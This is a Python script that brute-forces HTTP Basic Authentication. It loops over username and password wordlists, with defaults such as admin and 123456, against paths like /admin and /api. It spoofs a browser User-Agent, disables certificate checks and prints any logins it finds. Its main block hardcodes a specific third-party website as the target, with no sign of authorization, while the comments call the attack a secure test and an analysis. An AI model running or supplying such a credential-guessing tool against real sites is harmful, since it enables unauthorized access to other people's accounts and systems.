import requests
from requests.auth import HTTPBasicAuth
import urllib3
import os

# Suppress insecure request warnings if testing self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_wordlist(filepath):
    """Loads lines from a file into a list, ignoring empty lines and comments."""
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def test_http_auth(target_url, username, password, common_paths=None):
    """
    Tests HTTP Basic Authentication securely. Strictly requires a 401 challenge 
    to prevent false positives on public pages.
    """
    if common_paths is None:
        common_paths = ["/", "/login", "/admin", "/api", "/secure"]
        
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    results = []

    for path in common_paths:
        url = f"{target_url.rstrip('/')}{path}"
        
        try:
            # 1. Unauthenticated baseline request
            baseline = requests.get(
                url, 
                headers=headers, 
                timeout=5, 
                allow_redirects=True, 
                verify=False
            )
            
            # Skip paths that don't exist
            if baseline.status_code == 404:
                continue

            # 2. Check if the endpoint explicitly challenges for HTTP Basic Auth
            auth_challenged = (baseline.status_code == 401 or 'WWW-Authenticate' in baseline.headers)

            # If the page doesn't challenge for HTTP Basic Auth, it's a public page. 
            # Skip credential testing for this path.
            if not auth_challenged:
                continue

            # 3. Test credentials with HTTP Basic Auth
            resp = requests.get(
                url, 
                auth=HTTPBasicAuth(username, password), 
                headers=headers, 
                timeout=5, 
                allow_redirects=True, 
                verify=False
            )

            is_success = False
            if resp.status_code in [200, 204, 302] and resp.status_code != 401:
                is_success = True

            results.append({
                "path": path,
                "status_code": resp.status_code,
                "baseline_status": baseline.status_code,
                "auth_challenged": auth_challenged,
                "success": is_success
            })

        except requests.exceptions.RequestException:
            continue

    return results

def brute_force_auth(target_url, usernames_file, passwords_file, common_paths=None):
    """
    Loads usernames and passwords from files and tests all combinations.
    """
    usernames = load_wordlist(usernames_file)
    passwords = load_wordlist(passwords_file)

    # Fallback lists if files are missing or empty
    if not usernames:
        usernames = ["admin", "root", "user"]
        print("[-] Usernames file not found or empty. Using default fallback list.")
    if not passwords:
        passwords = ["password", "123456", "admin"]
        print("[-] Passwords file not found or empty. Using default fallback list.")

    print(f"[*] Loaded {len(usernames)} username(s) and {len(passwords)} password(s).")
    
    valid_credentials = []

    for user in usernames:
        for pwd in passwords:
            print(f"[*] Testing credentials -> {user}:{pwd}")
            results = test_http_auth(target_url, user, pwd, common_paths)
            
            for res in results:
                if res["success"]:
                    match_info = {
                        "username": user,
                        "password": pwd,
                        "path": res["path"],
                        "status_code": res["status_code"]
                    }
                    valid_credentials.append(match_info)
                    print(f"[+] [SUCCESS] Found valid login: {user}:{pwd} at path {res['path']} (Status: {res['status_code']})")
                    
    return valid_credentials

if __name__ == "__main__":
    TARGET_URL = "https://doktorbajskorv.se"  
    USERNAMES_FILE = "usernames.txt"
    PASSWORDS_FILE = "passwords.txt"
    
    print(f"[*] Starting HTTP Auth analysis on: {TARGET_URL}")
    found = brute_force_auth(TARGET_URL, USERNAMES_FILE, PASSWORDS_FILE)
    
    print(f"\n[+] Scan Complete. Total valid credentials found: {len(found)}")
